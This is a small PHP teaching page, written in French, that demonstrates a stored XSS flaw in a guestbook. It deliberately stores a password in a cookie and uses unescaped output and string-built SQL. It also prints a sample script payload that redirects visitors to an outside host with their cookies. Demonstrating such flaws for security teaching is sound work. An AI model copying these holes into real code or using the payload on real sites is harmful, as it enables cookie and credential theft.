<?php
setcookie('pwd', 'admin123');

$pdo = new PDO ("mysql:host=localhost;dbname=securite", 'root', '');
if(isset($_POST['ajouterMot'])){
$mot = $_POST['mot'];
$pdo->query("INSERT INTO livredor VALUES ('','$not')");
}   

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <h1>faille XSS</h1>
</body>

<?php

$selectall = $pdo->query("SELECT * FROM livredor");
$result = $selectall->fetchAll();
foreach ($result as $ligne) {
    echo $ligne['mot'] . '<br>';
}

?>

<h3>Livre d'or</h3>

<form method="post" action="#">
    Mon mot : <textarea name="mot" id="" cols="30" rows="10"></textarea><br>
    <input type="submit" value="Ajouter mon mot" name="ajouterMot" id="">
</form>

<p>Ce site stocke votre mot de passe dans un cookie</p>
<h3>Exemple d'attaque XSS</h3>
<input style="width:100%" value="<script>document.location=\https://tvinchent-epsi.github.io/xss.html?cookie=\'+document.cookie</script>" type="text">
<p> En ajoutant ce script comme entrée du livre d'or;
    <ul>
        <li> vous créez une redicrection vers mon script malveillant</li>
    </ul>
</p>



</html>
